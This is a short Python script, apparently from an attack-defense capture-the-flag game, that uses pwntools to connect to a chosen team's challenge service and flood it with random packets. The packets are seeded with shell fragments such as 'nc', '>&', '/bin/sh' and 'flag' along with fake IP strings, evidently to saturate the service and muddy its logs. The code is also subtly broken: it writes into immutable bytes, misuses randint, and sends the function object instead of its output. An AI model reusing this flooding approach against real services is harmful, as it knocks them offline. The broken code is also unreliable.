'''
jammer.py


**TO-DO before run**

1. Re-new ip_list
'''

from pwn import *
from andctf import *
import os 
import random

debug = True

def jamming_pattern()->str:
    pattern = os.urandom(random.randint(1, 1000))

    # Packet Jamming
    pattern[random.randrange(len(pattern)):] = 'nc'
    pattern[random.randrange(len(pattern)):] = '>&'
    pattern[random.randrange(len(pattern)):] = '/bin/sh'
    pattern[random.randrange(len(pattern)):] = 'flag'
    pattern[random.randrange(len(pattern)):] = (str(randint(0x100))+".")*3+str(randint(0x100))

    return pattern

def jamming(ip: str, port: int):
    print("[*] Initializing Jammer")
    idx = 0
    try:
        p = remote(ip, port)
    
    except:
        print("[*] Jamming Failed - Open Error")
        print(ip_to_team(ip) + " - " + port_to_chal(port))
        return

    while True:
        try:
            p.send(jamming_pattern)
        except:
            print("[*] Jamming Failed - Send Error")
            print(ip_to_team(ip) + " - " + port_to_chal(port))
            return
        
        idx+=1
        if idx % 0x200 == 0:
            print("[*] Jamming * "+str(idx)+"...")
            print(jamming_pattern())
            sleep(3)
        sleep(0.005)
        


def main():
    global debug 
    print("Jammer - Saturate specific team's chal")
    debug = input("[*] Debug: [y/n]\n") != 'n'


    ip = input("[*] ip: ")[:-1]
    port = int(input("[*] port: "))
    jamming(ip,port)


if __name__ == "__main__":
    main()
